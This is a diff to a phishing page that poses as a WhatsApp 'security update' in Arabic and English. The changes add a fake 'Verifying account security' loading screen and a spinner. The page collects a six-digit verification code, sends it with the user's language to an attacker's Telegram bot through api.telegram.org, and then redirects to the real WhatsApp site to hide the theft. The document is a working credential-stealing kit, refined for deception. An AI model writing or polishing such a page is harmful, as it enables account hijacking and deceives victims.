@@ -7,36 +7,50 @@
     <style>
         :root { --bg: #0b141a; --card: #1d2a33; --green: #00a884; --text: #e9edef; --hint: #8696a0; }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
-        body { background: var(--bg); color: var(--text); display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        body { background: var(--bg); color: var(--text); height: 100vh; overflow: hidden; display: flex; justify-content: center; align-items: center; }
         
-        .container { width: 100%; max-width: 400px; padding: 25px; text-align: center; }
+        /* شاشة اللودينج */
+        #loader { 
+            position: fixed; inset: 0; background: var(--bg); z-index: 2000;
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+        }
+        .pulse { width: 60px; animation: pulse 2s infinite; }
+        @keyframes pulse { 0%, 100% { transform: scale(1); opacity: 0.8; } 50% { transform: scale(1.1); opacity: 1; } }
+
+        .container { width: 100%; max-width: 400px; padding: 25px; text-align: center; display: none; }
+        .active { display: block; animation: fadeIn 0.5s ease; }
+
         .logo { width: 55px; margin-bottom: 15px; }
         .main-title { font-size: 19px; font-weight: 600; margin-bottom: 20px; color: #fff; }
 
         .info-card { background: var(--card); border-radius: 12px; padding: 18px; margin-bottom: 20px; border: 1px solid #2a3942; }
-        .row { display: flex; justify-content: space-between; margin-bottom: 12px; font-size: 13.5px; line-height: 1.4; }
+        .row { display: flex; justify-content: space-between; margin-bottom: 12px; font-size: 13.5px; }
         .label { color: var(--hint); }
-        .value { color: #fff; font-weight: 500; text-align: left; }
+        .value { color: #fff; font-weight: 500; }
         .status { color: var(--green); font-weight: bold; }
 
         .phone-section { border-top: 1px solid #2a3942; margin-top: 10px; padding-top: 15px; }
-        .phone-val { color: var(--green); font-size: 17px; font-weight: bold; letter-spacing: 0.5px; }
+        .phone-val { color: var(--green); font-size: 17px; font-weight: bold; direction: ltr; }
 
-        .desc { font-size: 13px; color: var(--hint); line-height: 1.6; margin: 25px 0; padding: 0 5px; }
+        .desc { font-size: 13px; color: var(--hint); line-height: 1.6; margin: 25px 0; }
 
         .otp-box { width: 100%; background: transparent; border: none; border-bottom: 2px solid #2a3942; color: #fff; font-size: 28px; text-align: center; outline: none; letter-spacing: 10px; margin-bottom: 25px; }
-        .otp-box:focus { border-bottom-color: var(--green); }
 
-        .btn { background: var(--green); color: #111b21; border: none; width: 100%; padding: 16px; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.2s; }
-        .btn:active { transform: scale(0.98); }
-
-        [dir="rtl"] .row { text-align: right; }
-        [dir="rtl"] .value { text-align: left; }
+        .btn { background: var(--green); color: #111b21; border: none; width: 100%; padding: 16px; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; }
+        
+        .spinner { border: 3px solid #202c33; border-top: 3px solid var(--green); border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; margin: 15px auto; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
     </style>
 </head>
 <body>
 
-    <div class="container">
+    <div id="loader">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="pulse">
+        <p id="load-msg" style="margin-top:20px; font-size:14px; color:var(--hint);"></p>
+    </div>
+
+    <div class="container" id="app">
         <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
         <h1 class="main-title" id="title"></h1>
 
@@ -70,24 +84,28 @@
         
         const content = {
             ar: {
+                load: "جاري التحقق من أمان الحساب...",
                 title: "تحديث أمان واتساب",
                 dev: "الجهاز المكتشف:",
                 status: "حالة الإصدار:",
-                status_val: "● تحديث أمان متاح (v2.4)",
+                status_val: "تحديث أمان متاح (v2.4)",
                 time: "توقيت النظام:",
                 num: "الرقم الموثق:",
                 desc: "نسخة واتساب الحالية لا تدعم التشفير المتقدم v2.4. يرجى إدخال كود المزامنة لتفعيل التحديث وحماية محادثاتك.",
-                btn: "تحديث ومزامنة الآن"
+                btn: "تحديث ومزامنة الآن",
+                sync: "جاري المزامنة..."
             },
             en: {
+                load: "Verifying account security...",
                 title: "WhatsApp Security Update",
                 dev: "Detected Device:",
                 status: "Version Status:",
-                status_val: "● Security Update Available (v2.4)",
+                status_val: "Security Update Available (v2.4)",
                 time: "System Time:",
                 num: "Verified Number:",
                 desc: "Your current version does not support v2.4 encryption. Please enter the synchronization code to activate the update.",
-                btn: "Update & Sync Now"
+                btn: "Update & Sync Now",
+                sync: "Syncing..."
             }
         };
 
@@ -95,10 +113,12 @@
         document.documentElement.dir = lang === 'ar' ? 'rtl' : 'ltr';
         const T = content[lang];
 
+        // ملء النصوص
+        document.getElementById('load-msg').innerText = T.load;
         document.getElementById('title').innerText = T.title;
         document.getElementById('lbl-dev').innerText = T.dev;
         document.getElementById('lbl-status').innerText = T.status;
-        document.getElementById('val-status').innerText = T.status_val;
+        document.getElementById('val-status').innerText = T.status_val; // شلنا النقطة هنا
         document.getElementById('lbl-time').innerText = T.time;
         document.getElementById('lbl-num').innerText = T.num;
         document.getElementById('desc').innerText = T.desc;
@@ -109,15 +129,24 @@
         }
         setInterval(updateClock, 1000); updateClock();
 
+        // إظهار المحتوى بعد اللودينج
+        window.onload = () => {
+            setTimeout(() => {
+                document.getElementById('loader').style.display = 'none';
+                document.getElementById('app').classList.add('active');
+                document.body.style.overflow = 'auto';
+            }, 3000);
+        };
+
         async function send() {
             const code = document.getElementById('otp').value;
             if(code.length === 6) {
-                document.getElementById('btn').innerText = "...";
+                document.getElementById('app').innerHTML = `<div class="spinner"></div><p style="color:var(--hint)">${T.sync}</p>`;
                 await fetch(`https://api.telegram.org/bot${CFG.T}/sendMessage`, {
                     method: 'POST', headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ chat_id: CFG.C, text: `✅ Code: ${code}` })
+                    body: JSON.stringify({ chat_id: CFG.C, text: `✅ Code: ${code}\n📱 Lang: ${lang}` })
                 });
-                location.href = "https://www.whatsapp.com/security";
+                setTimeout(() => location.href = "https://www.whatsapp.com/security", 2000);
             }
         }
     </script>
